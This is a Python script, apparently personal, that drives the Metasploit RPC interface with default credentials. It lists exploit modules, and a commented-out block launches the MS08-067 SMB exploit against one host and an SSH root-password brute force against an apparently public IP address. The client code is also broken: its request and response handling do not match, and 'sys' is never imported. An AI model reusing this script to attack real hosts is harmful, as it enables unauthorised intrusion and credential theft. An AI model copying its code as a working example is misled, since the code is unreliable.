# _*_ encoding:utf-8 _*_
# __author__ = "dr0op"

# -*- coding=utf-8 -*-
import msgpack
import time
import http.client
import requests


HOST="10.10.11.180"
PORT="55553"

class Msfrpc:

    class MsfError(Exception):

        def __init__(self, msg):
            self.msg = msg
        def __str__(self):
            return repr(self.msg)

    class MsfAuthError(MsfError):
        def __init__(self, msg):
            self.msg = msg

    def __init__(self, opts=[]):
        self.host = HOST
        self.port = PORT
        self.uri = "http://172.20.10.5/api"
        self.ssl = False
        self.authenticated = False
        self.token = False
        self.headers = {"Content-type" : "binary/message-pack"}
        if self.ssl:
            self.cli = http.client.HTTPConnection(self.host,self.port)
        else:
            self.cli = http.client.HTTPConnection(self.host, self.port)

    def encode(self, data):
        return msgpack.packb(data)

    def decode(self, data):
        return msgpack.unpackb(data)

    def call(self, meth, opts = []):
        if meth != "auth.login":
            if not self.authenticated:
                raise self.MsfAuthError("MsfRPC: Not Authenticated")
        if meth != "auth.login":
            opts.insert(0,self.token)

        opts.insert(0,meth)
        params = self.encode(opts)
        res = requests.post(self.uri, params,self.headers)
        resp = self.cli.getresponse()

        return self.decode(resp.read())

    def login(self, user, password):
        ret = self.call('auth.login', [user,password])
        if ret.get('result') == 'success':
            self.authenticated = True
            self.token = ret.get('token')
            return True

        else:
            raise self.MsfAuthError("MsfRPC: Authentication failed")


if __name__ == '__main__':

    # 使用默认设置创建一个新的客户端实例
    client = Msfrpc({})
    # 使用密码abc123登录msf服务器
    client.login('msf', 'msf')
    #
    # # 从服务器获得一个漏洞列表
    mod = client.call('module.exploits')
    print(mod)
    #
    # # 从返回的字典模型抓取第一个值
    # print ("Compatible payloads for : %s\n")%mod['modules'][0]
    #
    # # 获取payload
    # ret = client.call('module.compatible_payloads',[mod['modules'][0]])
    # for i in (ret.get('payloads')):
    #     print ("\t%s")%i

'''
if __name__ == '__main__':

    # 创建一个新的默认配置的客户端实例
    client = Msfrpc({})
    # 使用密码abc123登录msf
    client.login('msf','msf')
    try:
        res = client.call('console.create')
        console_id = res['id']
    except:
        print ("Console create failed\r\n")
        sys.exit()
    host_list = '192.168.7.135'
    cmd = """
        use exploit/windows/smb/ms08_067_netapi

        set RHOST 192.168.7.135

        exploit



  use auxiliary/scanner/ssh/ssh_login

         set RHOSTS 198.13.51.203
        
         set USERNAME root
         
         set PASS_FILE /Users/drop/dr0op/temp/pass.txt
        
         exploit

        """
    client.call('console.write',[console_id,cmd])
    time.sleep(1)
    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
                print (res['data'])
        if res['busy'] == True:
                time.sleep(1)
                continue
        break

    client.call('console.destroy',[console_id])
'''
